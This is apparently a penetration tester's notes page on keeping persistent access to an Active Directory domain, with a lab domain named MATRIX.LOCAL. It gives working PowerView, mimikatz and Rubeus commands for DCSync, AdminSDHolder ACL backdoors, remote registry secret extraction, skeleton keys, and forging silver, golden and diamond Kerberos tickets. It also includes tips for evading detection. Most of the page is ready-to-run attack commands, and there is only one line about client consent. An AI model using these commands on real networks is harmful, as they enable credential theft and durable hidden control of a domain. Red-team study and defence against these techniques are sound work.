## Domain Persistence

In a longer engagement, it may be beneficial to obtain recurring access to high-level domain users accounts to persist if your access gets lost. Domain persistence methods should only be carried out after confirming the client is happy with it, as they drastically will reduce the security of the domain/forest by implementing a "backdoor" of some sorts.

### DCSync

With the `Replicating Directory Changes` ACE, it is possible to replicate domain information and thus dump out the `krbtgt` hash of the root domain account. This is generally only possible by Domain Controllers, Domain Administrators and Enterprise Administrators.

With access to a DA account, we can provide the rights to a user using Powerview:

```powershell
# Provide Neo with Dcsync rights
Add-DomainObjectAcl -TargetIdentity "DC=MATRIX,DC=LOCAL" -PrincipalIdentity Neo -Rights DCSync
```

Then using mimikatz perform the attack:

```powershell
lsadump::dcsync /domain:MATRIX.local /user:MATRIX\krbtgt
```

### AdminSDHolder

This stands for Admin Security Descriptor Holder. Every hour, the Security Descriptor Propagator (SDPROP) service compares the Access Control Lists of protected groups and members with the Access Control Lists of the `AdminSDHolder` and any differences get overwritten on to their ACLs. This is a mechanism by which to control ACLs for certain privileged groups.

Using a Domain Administrator account, we can modify the `AdminSDHolder` ACL to give `GenericAll` to the Neo user using Powerview.

```powershell
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Neo -Rights All
```

We can then use Invoke-SDPropagator to force reload of the ACL, replicating our malicious ACL over all the protected groups.

 https://github.com/theyoge/AD-Pentesting-Tools/blob/main/Invoke-SDPropagator.ps1 

```powershell
Invoke-SDPropagator -showProgress -timeoutMinutes 1
```

### Remote Registry Backdoors

Using the DAMP project from harmj0y, we can modify discretionary access control lists (DACLs) to enable a user to extract remote secrets from a target. 

 https://github.com/HarmJ0y/DAMP 

```powershell
# Modify the DACL to all Neo to extract secrets from the target machine
Add-RemoteRegBackdoor -ComputerName dc04 -Trustee MATRIX\Neo

# Get the machine account hash
Get-RemoteMachineAccountHash -ComputerName dc04
```

### Skeleton Keys

I'd imagine this is one of the least used methods of persistence due to the potential side-effects. Allows all users to login with the password `mimikatz` by patching LSASS to hijack the NTLM and Kerberos authentication flows.

```powershell
mimikatz !misc::skeleton
```

### Silver Tickets

A Silver Ticket is a forged TGS, signed using the secret material (RC4/AES keys) of a machine account. You may forge a TGS for any user to any service on that machine, which is useful for short/medium-term persistence (until the computer account password changes, which is every 30 days by default).

Silver and Golden (below) tickets can be generated "offline" and imported into your session. This saves executing Mimikatz on the target unnecessarily which is better OPSEC. Generating both silver and golden tickets can be done with the Mimikatz `kerberos::golden` module.

On your attacking machine:

```powershell
kerberos::golden /user:Administrator /domain:MATRIX.LOCAL /sid:S-1-5-21-3619591028-1129495842-3952564 /target:fs01 /service:cifs /aes256:5c9cc0ef38c51bab5a2d2ece608181fb492ea55f61f055f1dbabf31e0d787aac /ticket:fs01-cifs.kirbi
```

### Golden Tickets

A Golden Ticket is a forged TGT, which gets encrypted with the domain's krbtgt account. In contrast to a Silver Ticket, which can be used to impersonate any user, but is limited the service and machine it targets, Golden Ticket's can be used to impersonate any user, to any service, on any machine in the domain.

`krbtgt` passwords are also never changed automatically and require a sysadmin to manually update them, meaning the persistence could be as long as that occurs for. Also, one previous `krbtgt` is stored for redundancy, meaning they actually have to update the password twice to remove this persistence method.

🚩 Note: The AES key below is from the krbtgt account. Using RC4 is also possible, but poor opsec as it's rarely used in modern environments. 🚩

```powershell
kerberos::golden /user:Administrator /domain:MATRIX.LOCAL /sid:S-1-5-21-3619591028-1129495842-3952564 /aes256:5c9cc0ef38c51bab5a2d2ece608181fb492ea55f61f055f1dbabf31e0d787aac /ticket:golden.kirbi
```

🚩 Mimikatz will automatically generate a ticket for 10 years unless you specify the `/startoffset /endin /renewmax` parameters. Try to line it up with the existing policy using `Get-DomainPolicy | select -expand KerberosPolicy`! 🚩


### Diamond Tickets

Diamond tickets are a variant of golden tickets aimed at reducing detection rates and indicatiors of compromise. Golden tickets are forged offline and passed to a logon session. TGT's aren't tracked by the Domain Controller, and thus, they accept them blindly if they conform to the domains constraints and are encrypted by the `krbtgt` hash. This has led to detection tactics looking for TGS-REQs that have no prior AS-REQ, as they've been generated at a point later than the point of the AS-REQ. 

Diamond tickets modify an existing TGT issued from a DC to add an element of legitimacy. This can be done using Rubeus. The ticket can be output and then saved to a .kirbi file to re-use at a later date. 

```powershell
C:\Rubeus.exe diamond /tgtdeleg /ticketuser:Neo /ticketuserid:1001 /groups:512 /krbkey:5c9cc0ef38c51bab5a2d2ece608181fb492ea55f61f055f1dbabf31e0d787aac /nowrap 
```